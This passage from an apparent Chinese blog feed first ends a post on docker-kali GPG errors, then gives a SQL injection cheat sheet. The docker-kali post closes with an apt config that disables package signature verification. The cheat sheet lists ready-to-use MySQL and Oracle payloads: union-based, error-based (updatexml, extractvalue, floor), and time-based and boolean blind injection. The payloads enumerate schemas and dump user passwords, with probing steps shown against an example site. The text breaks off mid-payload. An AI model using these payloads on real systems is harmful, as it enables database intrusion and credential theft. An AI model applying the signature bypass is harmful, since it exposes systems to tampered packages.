class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">wget http://http.kali.org/pool/main/k/kali-archive-keyring/kali-archive-keyring_2022.1_all.deb</span><span class="line">apt install ./kali-archive-keyring_2022.1_all.deb</span></code></pre></div></div><p>由于docker-kali没有wget，只能在主机下载好后挂载到docker-kali上安装。</p><p>但其实官方的keyring已经是最新的了，这个尝试是无效的。</p><h2 id="最终无奈的选择"><a href="#最终无奈的选择" class="headerlink" title="最终无奈的选择"></a>最终无奈的选择</h2><p>因为原因是不能验证，那么就忽略验证就可以了</p><ul><li>参考的是<a href="https://askubuntu.com/questions/74345/how-do-i-bypass-ignore-the-gpg-signature-checks-of-apt">这一篇讨论</a></li></ul><p>创建<code>/etc/apt/apt.conf.d/99allow_unauth</code>文件并将<code>gpg-pubkey</code>设置为忽略</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;APT &#123; Get &#123; AllowUnauthenticated &quot;1&quot;; &#125;; &#125;; Acquire &#123; AllowInsecureRepositories &quot;1&quot;; AllowDowngradeToInsecureRepositories &quot;1&quot;; &#125;;&#x27;</span> &gt; /etc/apt/apt.conf.d/99allow_unauth</span></code></pre></div></div><p>此时就可以正常使用了，只不过会有<code>Warning</code>，这也是没办法的一个办法。</p>]]></content>
      
      
      <categories>
          
          <category> 系统 </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker-kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql 注入合集</title>
      <link href="/2022/02/11/sql-%E6%B3%A8%E5%85%A5%E5%90%88%E9%9B%86/"/>
      <url>/2022/02/11/sql-%E6%B3%A8%E5%85%A5%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p><strong>SQL注入的攻击方式根据应用程序处理数据库返回内容的不同，可以分为可显注入、报错注入和盲注。本篇总结的很全了，尤其是新手而言，很有用.</strong></p><p><strong>可显注入</strong></p><p>攻击者可以直接在当前界面内容中获取想要获得的内容。</p><p><strong>报错注入</strong></p><p>数据库查询返回结果并没有在页面中显示，但是应用程序将数据库报错信息打印到了页面中，所以攻击者可以构造数据库报错语句，从报错信息中获取想要获得的内容。</p><p><strong>盲注</strong></p><p>数据库查询结果无法从直观页面中获取，攻击者通过使用数据库逻辑或使数据库库执行延时等方法获取想要获得的内容。</p><h2 id="Mysql-手工注入"><a href="#Mysql-手工注入" class="headerlink" title="Mysql 手工注入"></a><strong>Mysql 手工注入</strong></h2><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a><strong>联合注入</strong></h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 4--+</span></span><span class="line"><span class="hljs-string">?id=0&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,database()<span class="hljs-comment">--+</span></span><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span></span><span class="line"><span class="hljs-string">?id=0&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span>&quot;users&quot; <span class="hljs-comment">--+</span></span><span class="line">group_concat(column_name) 可替换为 unhex(Hex(<span class="hljs-built_in">cast</span>(column_name<span class="hljs-operator">+</span><span class="hljs-keyword">as</span><span class="hljs-operator">+</span><span class="hljs-type">char</span>)))column_name</span><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,3,group_concat(password) from users --+</span></span><span class="line"><span class="hljs-string">group_concat 可替换为 concat_ws(&#x27;</span>,<span class="hljs-string">&#x27;,id,users,password )</span></span><span class="line"><span class="hljs-string">?id=0&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,password <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-comment">--+</span></span></code></pre></div></div><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><strong>报错注入</strong></h3><p>1.floor()</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-keyword">user</span>(),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a);</span></code></pre></div></div><p>2.extractvalue()</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>)));</span></code></pre></div></div><p>3.updatexml()</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));</span></code></pre></div></div><p>4.geometrycollection()</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> geometrycollection((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</span></code></pre></div></div><p>5.multipoint()</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> multipoint((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</span></code></pre></div></div><p>6.polygon()</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> polygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</span></code></pre></div></div><p>7.multipolygon()</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> multipolygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</span></code></pre></div></div><p>8.linestring()</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> linestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</span></code></pre></div></div><p>9.multilinestring()</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> multilinestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</span></code></pre></div></div><p>10.exp()</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a));</span></code></pre></div></div><p>爆库：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,(select concat(0x7e,(schema_name),0x7e) from information_schema.schemata limit 2,1),1) -- +</span></span></code></pre></div></div><p>爆表：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,(select concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema=&#x27;</span>security<span class="hljs-string">&#x27; limit 3,1),1) -- +</span></span></code></pre></div></div><p>爆字段：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,(select concat(0x7e,(column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- +</span></span></code></pre></div></div><p>爆数据：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,(select concat(0x7e,password,0x7e) from users limit 1,1),1) -- +</span></span><span class="line"><span class="hljs-string">concat 也可以放在外面 updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1)</span></span></code></pre></div></div><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a><strong>盲注</strong></h3><p><strong>时间盲注</strong></p><p>常用函数 <code>sleep()</code></p><p>分割函数 <code>substr</code>、<code>substring</code>、<code>left</code></p><p>分割函数编码后可不用引号，ascii() hex()</p><p>一般时间盲注我们还需要使用条件判断函数</p><p>if（expre1，expre2，expre3）</p><p>当 expre1 为 true 时，返回 expre2，false 时，返回 expre3</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+</span></span><span class="line"><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> if((substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;r&#x27;</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span></span></code></pre></div></div><p><strong>布尔盲注</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and substr((select user()),1,1)=&#x27;</span>r<span class="hljs-string">&#x27; -- +</span></span><span class="line"><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> IFNULL((substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;r&#x27;</span>),<span class="hljs-number">0</span>) <span class="hljs-comment">-- +</span></span></code></pre></div></div><p>//如果 IFNULL 第一个参数的表达式为 NULL，则返回第二个参数的备用值，不为 Null 则输出值</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and strcmp((substr((select user()),1,1)=&#x27;</span>r<span class="hljs-string">&#x27;),1) -- +</span></span></code></pre></div></div><p>//若所有的字符串均相同，<code>STRCMP()</code> 返回 0，若根据当前分类次序，第一个参数小于第二个，则返回 -1 ，其它情况返回 1  </p><h3 id="insert-delete-update"><a href="#insert-delete-update" class="headerlink" title="insert,delete,update"></a><strong>insert,delete,update</strong></h3><p>这种注入会出现在 注册、ip头、留言板等等需要写入数据的地方，如用sqlmap会产生大量垃圾数据</p><p>尝试性插入、引号、双引号、转义符 <code>\\</code> 让语句不能正常执行，然后如果插入失败，更新失败，然后深入测试确定是否存在注入</p><h3 id="二次注入和宽字节注入"><a href="#二次注入和宽字节注入" class="headerlink" title="二次注入和宽字节注入"></a><strong>二次注入和宽字节注入</strong></h3><p><strong>二次注入</strong>：</p><p>没有单引号的sql语句中，进行16进制编码，这样就不会带有单引号</p><p><strong>宽字节注入：</strong></p><p>单引号转义为 <code>&#39;</code> , mysql 会将 <code>\\</code> 编码为 <code>%5c</code> ，宽字节中两个字节代表一个汉字</p><p>所以把 <code>%df</code> 加上 <code>%5c</code> 就变成了一个汉字“運”，从而绕过转义</p><h2 id="Oracle-手工注入"><a href="#Oracle-手工注入" class="headerlink" title="Oracle 手工注入"></a><strong>Oracle 手工注入</strong></h2><h3 id="联合注入-1"><a href="#联合注入-1" class="headerlink" title="联合注入"></a><strong>联合注入</strong></h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select user,null from dual--</span></span><span class="line"><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> version,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> v$instance<span class="hljs-comment">--</span></span><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select table_name,null from (select * from (select rownum as limit,table_name from user_tables) where limit=3)--</span></span><span class="line"><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> column_name,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> rownum <span class="hljs-keyword">as</span> limit,column_name <span class="hljs-keyword">from</span> user_tab_columns <span class="hljs-keyword">where</span> table_name <span class="hljs-operator">=</span><span class="hljs-string">&#x27;USERS&#x27;</span>) <span class="hljs-keyword">where</span> limit<span class="hljs-operator">=</span><span class="hljs-number">2</span>)<span class="hljs-comment">--</span></span><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select username,passwd from users--</span></span><span class="line"><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> username,passwd <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> username,passwd,rownum <span class="hljs-keyword">as</span> limit <span class="hljs-keyword">from</span> users) <span class="hljs-keyword">where</span> limit<span class="hljs-operator">=</span><span class="hljs-number">3</span>)<span class="hljs-comment">--</span></span></code></pre></div></div><h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a><strong>报错注入</strong></h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=ctxsys.drithsx.sn(1,(select user from dual))--?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>ctxsys.drithsx.sn(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> banner <span class="hljs-keyword">from</span> v$version <span class="hljs-keyword">where</span> banner <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;Oracle%))--</span></span><span class="line"><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>ctxsys.drithsx.sn(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> rownum <span class="hljs-keyword">as</span> limit,table_name <span class="hljs-keyword">from</span> user_tables) <span class="hljs-keyword">where</span> limit<span class="hljs-operator">=</span> <span class="hljs-number">3</span>))<span class="hljs-comment">--</span></span><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=ctxsys.drithsx.sn(1,(select column_name from (select rownum as limit,column_name from user_tab_columns where table_name =&#x27;</span>USERS<span class="hljs-string">&#x27;) where limit=3))--</span></span><span class="line"><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>ctxsys.drithsx.sn(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> passwd <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> passwd,rownum <span class="hljs-keyword">as</span> limit <span class="hljs-keyword">from</span> users) <span class="hljs-keyword">where</span> limit<span class="hljs-operator">=</span><span class="hljs-number">1</span>))<span class="hljs-comment">--</span></span></code></pre></div></div><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=(select decode(user,&#x27;</span><span class="hljs-keyword">SYSTEM</span><span class="hljs-string">&#x27;,1,0,0) from dual)--</span></span><span class="line"><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> decode(substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual)<span class="hljs-comment">--</span></span><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substr(user,1,1))&gt; 64--</span></span></code></pre></div></div><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a><strong>时间盲注</strong></h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=(case when ascii(substr(user,1,1))&gt; 128 then DBMS_PIPE.RECEIVE_MESSAGE(&#x27;</span>a<span class="hljs-string">&#x27;,5) else 1 end)--</span></span><span class="line"><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> ascii(substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span> <span class="hljs-number">64</span> <span class="hljs-keyword">then</span> DBMS_PIPE.RECEIVE_MESSAGE(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">1</span> <span class="hljs-keyword">end</span>)<span class="hljs-comment">--</span></span></code></pre></div></div><p><strong>SQL手工注入</strong>  </p><hr><h3 id="判断注入点是否存在"><a href="#判断注入点是否存在" class="headerlink" title="判断注入点是否存在"></a><strong>判断注入点是否存在</strong></h3><p><strong>数字型注入</strong></p><p>url后输入</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span></span><span class="line"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span></span></code></pre></div></div><p>如返回不同，则可判断注入点存在  </p><p>例：</p><p><a href="http://www.xxx.cn/news.php?p=1&amp;id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a>  返回错误</p><p><a href="http://www.xxx.cn/news.php?p=1&amp;id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a>  and 1=1 返回正确</p><p><a href="http://www.xxx.cn/news.php?p=1&amp;id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a>  and 1=2 返回错误</p><p><strong>字符型注入</strong></p><p>url后输入</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-string">&#x27; and 1=1 and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span></span><span class="line"><span class="hljs-string">&#x27; and 1=2 and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span></span></code></pre></div></div><p><a href="http://www.xxx.cn/news.php?p=1&amp;id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a>  返回错误  </p><p><a href="http://www.xxx.cn/news.php?p=1&amp;id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a>  and 1=1 and ‘1’=’1 返回正确</p><p><a href="http://www.xxx.cn/news.php?p=1&amp;id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a>  and 1=2 and ‘1’=’1 返回错误</p><p><strong>搜索型注入</strong></p><p>输入框中输入</p><p><code>&#39;</code> 返回错误</p><p>x%’ and 1=1 and ‘%’=’ 返回正确</p><p>x%’ and 1=2 and ‘%’=’ 返回错误</p><h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a><strong>判断字段数</strong></h3><p><strong>数字型</strong></p><p><a href="http://www.xxx.cn/news.php?p=1&amp;id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a>   order by 26 返回正确</p><p><a href="http://www.xxx.cn/news.php?p=1&amp;id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a>  order by 27 返回错误</p><p>得出结论：字段数26。</p><p><strong>字符型</strong></p><p><a href="http://www.xxx.cn/news.php?p=1&amp;id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a>   order by 26 # 返回正确</p><p><a href="http://www.xxx.cn/news.php?p=1&amp;id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a>  order by 27 # 返回错误</p><p>得出结论：字段数26。</p><p><strong>搜索型</strong></p><p>x%’ order by 26 # 返回正确</p><p>x%’ order by 27 # 返回错误</p><p>得出结论：字段数26。</p><h3 id="寻找可显示字段"><a href="#寻找可显示字段" class="headerlink" title="寻找可显示字段"></a><strong>寻找可显示字段</strong></h3><p><strong>数字型</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxx.cn<span class="hljs-operator">/</span>news.php?p<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">4</span>  <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,....</span></code></pre></div></div><p><strong>字符型</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxx.cn<span class="hljs-operator">/</span>news.php?p<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">4</span>  <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,.... #</span></code></pre></div></div><p><strong>搜索型</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">x<span class="hljs-operator">%</span><span class="hljs-string">&#x27; and 1=2 union select 1,2,3,4,5,6,7,8,9,.... #</span></span></code></pre></div></div><h3 id="查数据库名"><a href="#查数据库名" class="headerlink" title="查数据库名"></a><strong>查数据库名</strong></h3><p><strong>数字型</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxx.cn<span class="hljs-operator">/</span>news.php?p<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">4</span>  <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database(),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,....</span></code></pre></div></div><p><strong>字符型</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxx.cn<span class="hljs-operator">/</span>news.php?p<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">4</span>  <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database(),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span 